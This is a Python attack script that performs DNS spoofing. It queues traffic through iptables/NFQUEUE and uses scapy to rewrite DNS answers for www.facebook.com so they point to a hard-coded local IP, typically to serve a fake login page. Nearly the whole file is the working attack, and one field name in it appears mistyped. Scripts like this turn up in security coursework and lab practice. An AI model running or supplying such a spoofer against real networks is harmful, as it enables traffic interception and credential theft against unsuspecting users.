import netfilterqueue
import subprocess
import scapy.all as scapy

myIP="192.168.132.128"
def packed_q(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        site_name=scapy_packet[scapy.DNSQR].qname
        #check for specific website
        if "www.facebook.com" in site_name.decode('utf-8'):
            print("Found Target Website:  " + site_name.decode('utf-8'))
            ans=scapy.DNSRR(rrname=site_name,rdata=myIP)
            scapy_packet[scapy.DNS].an=ans
            scapy_packet[scapy.DNS].account=1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            #final_packet=str(scapy_packet(Raw))
            packet.set_payload(bytes(scapy_packet))
                      
    packet.accept()

try:
    subprocess.run("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
    subprocess.run("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
    #subprocess.run("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True) 
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,packed_q)
    queue.run()
except KeyboardInterrupt:
    subprocess.run("iptables --flush",shell=True)